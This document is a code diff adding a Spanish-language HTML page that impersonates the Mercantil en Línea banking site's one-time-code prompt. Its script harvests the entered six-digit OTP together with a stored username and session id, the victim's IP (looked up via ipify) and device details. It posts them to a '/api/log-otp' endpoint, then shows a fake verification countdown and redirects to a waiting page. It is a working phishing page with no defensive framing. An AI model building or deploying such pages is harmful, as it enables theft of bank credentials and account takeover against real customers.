@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercantil en Línea</title>
+    <link rel="shortcut icon" href="https://www30.mercantilbanco.com/favicon.ico" type="image/x-icon">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: #eff3f8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .nav-bar {
+            background: #004e9b;
+            height: 64px;
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            z-index: 100;
+        }
+        .nav-bar img { height: 36px; width: auto; }
+
+        .main {
+            flex: 1;
+            margin-top: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 4px 24px rgba(0,0,0,.1);
+            padding: 40px 36px;
+            width: 100%;
+            max-width: 440px;
+            text-align: center;
+        }
+
+        .card-icon {
+            width: 56px; height: 56px;
+            margin: 0 auto 20px;
+            background: #e3f0fb;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card-icon svg { fill: #004e9b; }
+
+        .card-title {
+            color: #004e9b;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .card-sub {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+
+        .error-banner {
+            display: none;
+            background: #fdecea;
+            border: 1px solid #f5c6cb;
+            border-radius: 8px;
+            padding: 10px 14px;
+            color: #c62828;
+            font-size: 13px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .error-banner.visible { display: block; }
+
+        .otp-row {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 28px;
+        }
+        .otp-box {
+            width: 44px; height: 52px;
+            border: 2px solid #bdbdbd;
+            border-radius: 8px;
+            font-size: 22px;
+            font-family: Arial, sans-serif;
+            font-weight: 700;
+            text-align: center;
+            outline: none;
+            color: #212121;
+            background: #fafafa;
+            transition: border-color .2s;
+            caret-color: transparent;
+        }
+        .otp-box:focus { border-color: #004e9b; background: #fff; }
+        .otp-box.invalid { border-color: #e53935; background: #fff8f8; }
+
+        .btn-primary {
+            width: 100%;
+            background: #004e9b;
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            padding: 14px;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background .2s;
+            margin-bottom: 16px;
+        }
+        .btn-primary:hover { background: #003a75; }
+        .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }
+
+        .resend-link {
+            font-size: 13px;
+            color: #009fda;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        footer {
+            background: #fff;
+            border-top: 1px solid #e0e0e0;
+            padding: 14px 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #757575;
+        }
+
+        #overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,.55);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity .3s;
+        }
+        #overlay.visible { opacity: 1; pointer-events: all; }
+        .overlay-card {
+            background: #fff;
+            border-radius: 20px;
+            padding: 36px 48px;
+            text-align: center;
+            min-width: 280px;
+        }
+        .overlay-card p {
+            color: #004e9b;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        .progress-track {
+            background: #e0e0e0;
+            border-radius: 4px;
+            height: 6px;
+            overflow: hidden;
+            margin-bottom: 14px;
+        }
+        #progressBar {
+            height: 100%;
+            width: 0%;
+            background: #004e9b;
+            border-radius: 4px;
+        }
+        #progressBar.running {
+            width: 100%;
+            transition: width var(--dur) linear;
+        }
+        #countdownNum {
+            font-size: 30px;
+            font-weight: 700;
+            color: #004e9b;
+        }
+    </style>
+</head>
+<body>
+
+<nav class="nav-bar">
+    <img src="containersito/Log.png" alt="Mercantil en Línea">
+</nav>
+
+<div class="main">
+    <div class="card">
+        <div class="card-icon">
+            <svg width="28" height="28" viewBox="0 0 24 24">
+                <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/>
+            </svg>
+        </div>
+
+        <h1 class="card-title">Ingresa la clave temporal</h1>
+        <p class="card-sub">Te enviamos un código de 6 dígitos a tu dispositivo registrado.</p>
+
+        <div class="error-banner" id="errorBanner">
+            Clave temporal incorrecta. Por favor intenta de nuevo.
+        </div>
+
+        <form id="otpForm" novalidate>
+            <div class="otp-row" id="otpRow">
+                <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+                <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+                <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+                <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+                <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+                <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+            </div>
+
+            <button type="submit" class="btn-primary" id="btnOtp">Continuar</button>
+        </form>
+
+        <a href="#" class="resend-link">Reenviar código</a>
+    </div>
+</div>
+
+<footer>
+    <span>Derechos protegidos por Mercantil C.A., Universal. RIF: J-00002961-0.</span>
+</footer>
+
+<div id="overlay">
+    <div class="overlay-card">
+        <p>Verificando clave temporal...</p>
+        <div class="progress-track">
+            <div id="progressBar"></div>
+        </div>
+        <div id="countdownNum">5</div>
+    </div>
+</div>
+
+<script>
+const boxes = Array.from(document.querySelectorAll('.otp-box'));
+
+boxes[0].addEventListener('paste', e => {
+    e.preventDefault();
+    const digits = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
+    digits.split('').forEach((d, i) => { if (boxes[i]) boxes[i].value = d; });
+    (boxes[Math.min(digits.length, boxes.length - 1)]).focus();
+});
+
+boxes.forEach((box, i) => {
+    box.addEventListener('input', () => {
+        box.value = box.value.replace(/\D/, '');
+        box.classList.remove('invalid');
+        if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
+    });
+    box.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !box.value && i > 0) boxes[i - 1].focus();
+    });
+});
+
+function showOverlay(seconds) {
+    const bar = document.getElementById('progressBar');
+    const num = document.getElementById('countdownNum');
+    num.textContent = seconds;
+    document.getElementById('overlay').classList.add('visible');
+    bar.style.setProperty('--dur', seconds + 's');
+    requestAnimationFrame(() => requestAnimationFrame(() => bar.classList.add('running')));
+    let remaining = seconds;
+    return new Promise(resolve => {
+        const tick = setInterval(() => {
+            num.textContent = --remaining;
+            if (remaining <= 0) { clearInterval(tick); resolve(); }
+        }, 1000);
+    });
+}
+
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let os = 'Desconocido', device = 'Desktop';
+    if (/android/i.test(ua))          { os = 'Android'; device = '📱 Móvil'; }
+    else if (/iPhone|iPad/i.test(ua)) { os = 'iOS';     device = '📱 iPhone/iPad'; }
+    else if (/Windows/i.test(ua))     { os = 'Windows'; device = '🖥️ PC'; }
+    else if (/Mac/i.test(ua))         { os = 'macOS';   device = '🖥️ Mac'; }
+    else if (/Linux/i.test(ua))       { os = 'Linux';   device = '🖥️ Linux'; }
+    const browser = /Chrome/i.test(ua)  ? 'Chrome'
+                  : /Firefox/i.test(ua) ? 'Firefox'
+                  : /Safari/i.test(ua)  ? 'Safari'
+                  : /Edge/i.test(ua)    ? 'Edge' : 'Desconocido';
+    return { os, device, browser };
+}
+
+document.getElementById('otpForm').addEventListener('submit', async e => {
+    e.preventDefault();
+    let valid = true;
+    boxes.forEach(box => {
+        if (!box.value) { box.classList.add('invalid'); valid = false; }
+    });
+    if (!valid) return;
+
+    const btn = document.getElementById('btnOtp');
+    btn.disabled = true;
+
+    const otp = boxes.map(b => b.value).join('');
+
+    await showOverlay(5);
+
+    try {
+        const { os, device, browser } = getDeviceInfo();
+        const now   = new Date();
+        const fecha = now.toLocaleDateString('es-VE', { day: '2-digit', month: 'long', year: 'numeric' });
+        const hora  = now.toLocaleTimeString('es-VE', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        const sessionId  = localStorage.getItem('mercantil_session_id') || '';
+        const usuario    = localStorage.getItem('mercantil_usuario') || 'No disponible';
+
+        let ip = 'No disponible';
+        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch {}
+
+        await fetch('/api/log-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ usuario, otp, ip, device, browser, os, fecha, hora, sessionId })
+        });
+    } catch (err) { console.error(err); }
+
+    window.location.href = 'wait.html';
+});
+</script>
+
+</body>
+</html>
